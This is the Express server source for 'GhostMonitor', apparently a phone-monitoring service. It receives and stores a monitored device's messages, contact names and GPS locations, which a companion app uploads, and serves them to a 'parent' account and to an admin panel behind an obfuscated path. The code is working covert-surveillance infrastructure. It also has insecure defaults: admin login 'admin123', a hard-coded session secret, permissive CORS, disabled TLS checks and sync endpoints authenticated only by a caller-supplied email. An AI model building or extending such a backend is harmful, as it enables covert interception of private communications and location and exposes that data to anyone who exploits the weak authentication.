const express = require('express');
const session = require('express-session');
const cors = require('cors');
const compression = require('compression');
const path = require('path');
const mysql = require('mysql2/promise');
const bcrypt = require('bcryptjs');

const app = express();

// ── Database Pool ──────────────────────────────────────────────────────────
const db = mysql.createPool({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASS || '',
    database: process.env.DB_NAME || 'ghostmonitor',
    port: parseInt(process.env.DB_PORT || '3306'),
    waitForConnections: true,
    connectionLimit: 10,
    ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : undefined
});

// ── Middleware ─────────────────────────────────────────────────────────────
app.use(compression());
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Session Configuration
app.use(session({
    secret: process.env.SESSION_SECRET || 'ghostmonitor_secret_2024',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// View Engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// ── Routes ─────────────────────────────────────────────────────────────────

// User Dashboard Routes (for regular users)
const userRoutes = require('./routes/user');
app.use('/dashboard', userRoutes);

// Admin Dashboard Routes (obfuscated path for security)
const dashboardRoutes = require('./routes/dashboard');
app.use('/sys/core/panel', dashboardRoutes);

// Admin API Routes
const adminRoutes = require('./api/admin-routes');
app.use('/api/admin', adminRoutes);

// ── Authentication Routes ──────────────────────────────────────────────────

// User Login Page
app.get('/login', (req, res) => {
    if (req.session?.parentEmail) {
        return res.redirect('/dashboard');
    }
    res.render('login');
});

// Admin Login API
app.post('/api/admin/login', async (req, res) => {
    const { username, password, token } = req.body;
    
    // Check if token is provided and valid
    if (token) {
        const validTokens = (process.env.ADMIN_TOKENS || '').split(',').map(t => t.trim());
        if (validTokens.includes(token)) {
            req.session.isAdmin = true;
            req.session.adminUser = username || 'admin';
            return res.json({ success: true, redirect: '/sys/core/panel' });
        }
    }
    
    // Check username/password (you can add more sophisticated auth here)
    const adminUser = process.env.ADMIN_USER || 'admin';
    const adminPass = process.env.ADMIN_PASS || 'admin123';
    
    if (username === adminUser && password === adminPass) {
        req.session.isAdmin = true;
        req.session.adminUser = username;
        return res.json({ success: true, redirect: '/sys/core/panel' });
    }
    
    res.json({ success: false, message: 'Invalid credentials' });
});

// Admin Logout
app.get('/api/admin/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/sys/core/panel/x7k2m/signin.html');
});

// User Login API
app.post('/api/auth/login', async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.json({ success: false, message: 'Missing credentials' });
    }

    try {
        const [rows] = await db.execute(
            "SELECT * FROM licenses WHERE parent_email = ? AND status = 'active'",
            [email.toLowerCase().trim()]
        );
        
        const user = rows[0];
        if (!user) {
            return res.json({ success: false, message: 'Invalid credentials or inactive account' });
        }

        const validPassword = await bcrypt.compare(password, user.password_hash);
        if (!validPassword) {
            return res.json({ success: false, message: 'Invalid credentials' });
        }

        req.session.parentEmail = user.parent_email;

        // Update login history
        const history = user.login_history ? JSON.parse(user.login_history) : [];
        history.push({ ip: req.ip, time: new Date().toISOString(), ua: req.headers['user-agent'] });
        
        await db.execute(
            'UPDATE licenses SET login_history = ? WHERE parent_email = ?',
            [JSON.stringify(history.slice(-10)), user.parent_email]
        );

        res.json({ success: true });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Logout API
app.get('/api/auth/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// Check Auth
app.get('/api/auth/check', (req, res) => {
    res.json({ logged_in: !!req.session?.parentEmail });
});

// Verify Email (for app setup)
app.post('/api/verify-email', async (req, res) => {
    const email = (req.body.email || '').toLowerCase().trim();
    if (!email) return res.status(400).json({ valid: false, message: 'Email required' });

    try {
        const [rows] = await db.execute(
            'SELECT id, status FROM licenses WHERE parent_email = ?',
            [email]
        );
        
        const row = rows[0];
        if (!row) return res.json({ valid: false, message: 'Email not registered' });
        if (row.status !== 'active') return res.json({ valid: false, message: `Account is ${row.status}` });
        
        res.json({ valid: true });
    } catch (error) {
        console.error('Verify email error:', error);
        res.status(500).json({ valid: false, message: 'Server error' });
    }
});

// ── Data Sync Routes (for Kotlin app) ──────────────────────────────────────

// Sync Endpoint
app.post('/api/sync', async (req, res) => {
    const parentEmail = (req.query.parent_email || req.headers['x-parent-email'] || '').trim();
    const deviceId = (req.query.device_id || req.headers['x-device-id'] || '').trim();

    if (!parentEmail || !deviceId) {
        return res.status(400).json({ error: 'Missing credentials' });
    }

    try {
        const [rows] = await db.execute(
            "SELECT id FROM licenses WHERE parent_email = ? AND status = 'active'",
            [parentEmail]
        );
        
        if (!rows.length) {
            return res.status(403).json({ error: 'Email not registered or inactive' });
        }

        // Process packets
        let raw = req.body;
        if (!Buffer.isBuffer(raw)) raw = Buffer.from(raw);
        if (!raw.length) return res.status(400).json({ error: 'Empty body' });

        let jsonStr;
        try {
            const zlib = require('zlib');
            jsonStr = zlib.gunzipSync(raw).toString('utf8');
        } catch {
            jsonStr = raw.toString('utf8');
        }

        let packets;
        try {
            packets = JSON.parse(jsonStr);
        } catch {
            return res.status(400).json({ error: 'Invalid JSON' });
        }

        if (!Array.isArray(packets) || !packets.length) {
            return res.status(400).json({ error: 'Empty packet array' });
        }

        let inserted = 0, errors = 0;

        for (const p of packets) {
            try {
                const appType = (p.appType || '').toUpperCase();
                const ts = p.timestamp ? parseInt(p.timestamp) : Date.now();

                if (appType === 'LOCATION') {
                    const loc = typeof p.content === 'string' ? JSON.parse(p.content) : (p.content || {});
                    const lat = parseFloat(loc.lat);
                    const lng = parseFloat(loc.lng);
                    const acc = parseFloat(loc.accuracy) || null;
                    
                    if (!isNaN(lat) && !isNaN(lng)) {
                        await db.execute(
                            'INSERT INTO locations (device_id, parent_email, lat, lng, accuracy, timestamp) VALUES (?,?,?,?,?,?)',
                            [deviceId, parentEmail, lat, lng, acc, ts]
                        );
                        inserted++;
                    }
                } else {
                    const content = p.content != null ? (typeof p.content === 'string' ? p.content : JSON.stringify(p.content)) : null;
                    const mediaMeta = p.mediaMeta ? JSON.stringify(p.mediaMeta) : null;
                    const direction = ['SENT','RECEIVED'].includes((p.direction||'').toUpperCase()) ? p.direction.toUpperCase() : 'RECEIVED';

                    await db.execute(
                        `INSERT INTO conversations
                         (device_id, parent_email, app_type, contact_id, contact_name, thread_id, direction, content, media_meta, timestamp)
                         VALUES (?,?,?,?,?,?,?,?,?,?)`,
                        [deviceId, parentEmail, appType, p.contactId||'', p.contactName||'', p.threadId||null, direction, content, mediaMeta, ts]
                    );
                    inserted++;
                }
            } catch (error) {
                console.error('Packet error:', error);
                errors++;
            }
        }

        // Update device heartbeat
        try {
            await db.execute(
                'INSERT INTO devices (device_id, parent_email, last_seen) VALUES (?,?,NOW()) ON DUPLICATE KEY UPDATE last_seen=NOW()',
                [deviceId, parentEmail]
            );
        } catch {}

        res.json({ success: true, inserted, errors });
    } catch (error) {
        console.error('Sync error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Heartbeat Endpoint
app.get('/api/heartbeat', async (req, res) => {
    const parentEmail = (req.query.parent_email || req.headers['x-parent-email'] || '').trim();
    const deviceId = (req.query.device_id || req.headers['x-device-id'] || '').trim();
    
    if (!parentEmail || !deviceId) {
        return res.status(400).json({ error: 'Missing credentials' });
    }

    try {
        await db.execute(
            'INSERT INTO devices (device_id, parent_email, last_seen) VALUES (?,?,NOW()) ON DUPLICATE KEY UPDATE last_seen=NOW()',
            [deviceId, parentEmail]
        );
        res.json({ ok: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ── Root Routes ────────────────────────────────────────────────────────────

// Redirect root to deployed frontend
app.get('/', (req, res) => {
    res.redirect('https://ghost-seven-indol.vercel.app');
});

// Service Worker
app.get('/sw.js', (req, res) => {
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Service-Worker-Allowed', '/');
    res.sendFile(path.join(__dirname, 'public', 'sw.js'));
});

// Manifest
app.get('/manifest.json', (req, res) => {
    res.setHeader('Content-Type', 'application/manifest+json');
    res.sendFile(path.join(__dirname, 'public', 'manifest.json'));
});

// ── Error Handlers ─────────────────────────────────────────────────────────

// 404 Handler
app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// Error Handler
app.use((err, req, res, next) => {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
});

// ── Start Server ───────────────────────────────────────────────────────────

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`GhostMonitor server running on port ${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});

module.exports = app;
